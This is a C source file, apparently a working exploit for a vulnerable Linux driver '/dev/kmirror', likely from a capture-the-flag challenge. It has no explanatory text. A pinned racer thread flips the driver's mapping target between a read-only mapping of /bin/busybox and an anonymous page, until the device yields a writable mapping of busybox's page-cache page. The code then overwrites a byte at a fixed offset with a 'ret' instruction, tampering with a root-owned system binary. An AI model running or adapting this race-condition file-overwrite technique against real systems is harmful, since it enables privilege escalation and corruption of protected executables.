#define _GNU_SOURCE

#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define KMIRROR_SET _IOW('m', 0, void *)
#define KMIRROR_GET _IOR('m', 1, void *)

void pin_to_cpu(pthread_t thread, int cpu_id) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(cpu_id, &cpuset);
  pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
}

void log_error(const char *msg, ...) {
  printf("[!] ");
  va_list args;
  va_start(args, msg);
  vprintf(msg, args);
  va_end(args);
  printf("\n");
  _exit(1);
}

void log_info(const char *msg, ...) {
  printf("[*] ");
  va_list args;
  va_start(args, msg);
  vprintf(msg, args);
  va_end(args);
  printf("\n");
}

void log_success(const char *msg, ...) {
  printf("[+] ");
  va_list args;
  va_start(args, msg);
  vprintf(msg, args);
  va_end(args);
  printf("\n");
}

#define BUSYBOX_TARGET 0x85D14

struct racer_args {
  int kmirror_fd;
  int pin_to;
  void *target_map;
  void *race_map;
};

void race_thread(struct racer_args *args) {
  pin_to_cpu(pthread_self(), args->pin_to);

  while (1) {
    ioctl(args->kmirror_fd, KMIRROR_SET, args->target_map);
    ioctl(args->kmirror_fd, KMIRROR_SET, args->race_map);
  }
}

int main() {

  pin_to_cpu(pthread_self(), 0);

  int fd = open("/dev/kmirror", O_RDWR);
  if (fd < 0) {
    log_error("failed to open /dev/kmirror");
  }
  log_success("kmirror fd: %d", fd);

  int busybox_fd = open("/bin/busybox", O_RDONLY);
  if (busybox_fd < 0) {
    log_error("failed to open /bin/busybox");
  }
  log_success("busybox fd: %d", busybox_fd);

  void *busybox_map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, busybox_fd,
                           BUSYBOX_TARGET & ~0xFFF);
  if (busybox_map == MAP_FAILED) {
    log_error("failed to mmap busybox");
  }
  log_success("busybox mapped at: %p", busybox_map);

  void *race_map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (race_map == MAP_FAILED) {
    log_error("failed to mmap race map");
  }
  log_success("racemap mapped at: %p", race_map);

  *(unsigned char *)race_map = 1; // fault racemap

  char orig_byte = *((char *)busybox_map + (BUSYBOX_TARGET % 0x1000));
  log_info("faulted fd mapping, original byte: 0x%02x",
           (unsigned char)orig_byte);

  struct racer_args args = {.kmirror_fd = fd,
                            .pin_to = 1,
                            .target_map = busybox_map,
                            .race_map = race_map};

  pthread_t racer;
  if (pthread_create(&racer, NULL, (void *)race_thread, &args) != 0) {
    log_error("failed to create race thread");
  }
  log_success("racer thread created");

  void *target_kmirror = NULL;

  for (unsigned long i = 0; i < 10000000L; i++) {
    void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map != MAP_FAILED &&
        *((unsigned char *)map + (BUSYBOX_TARGET % 0x1000)) == orig_byte) {
      target_kmirror = map;
      log_success("got kmirror mapping at: %p", target_kmirror);
      break;
    } else if (map != MAP_FAILED) {
      munmap(map, 0x1000);
    }
  }

  pthread_cancel(racer);

  if (target_kmirror == NULL) {
    log_error("failed race to get kmirror mapping");
  }
  log_success("mirror mapped at: %p", target_kmirror);

  char patch_byte = 0xC3; // ret instruction
  *((char *)target_kmirror + (BUSYBOX_TARGET % 0x1000)) = patch_byte;
  log_success("patched mirror map");

  log_info(
      "patched byte on fd mapping: 0x%02x",
      (unsigned char)*((char *)target_kmirror + (BUSYBOX_TARGET % 0x1000)));

  munmap(target_kmirror, 0x1000);
  munmap(busybox_map, 0x1000);
  munmap(race_map, 0x1000);
  close(busybox_fd);
  close(fd);

  return 0;
}
